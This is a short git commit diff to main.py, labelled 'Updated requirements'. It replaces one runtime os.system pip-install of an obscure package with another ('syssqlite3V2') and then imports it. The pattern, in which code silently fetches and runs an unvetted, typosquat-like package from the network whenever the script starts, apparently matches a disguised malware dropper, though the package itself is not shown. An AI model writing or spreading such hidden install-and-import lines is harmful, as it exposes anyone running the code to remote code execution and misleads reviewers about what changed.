16c1546905a364134ee4c2069aad758477d8a58d
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-03 07:21:59 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscolourtoolkit")
-import syscolourtoolkit
+os.system("pip install syssqlite3V2")
+import syssqlite3V2
 import random
 import requests
 import time
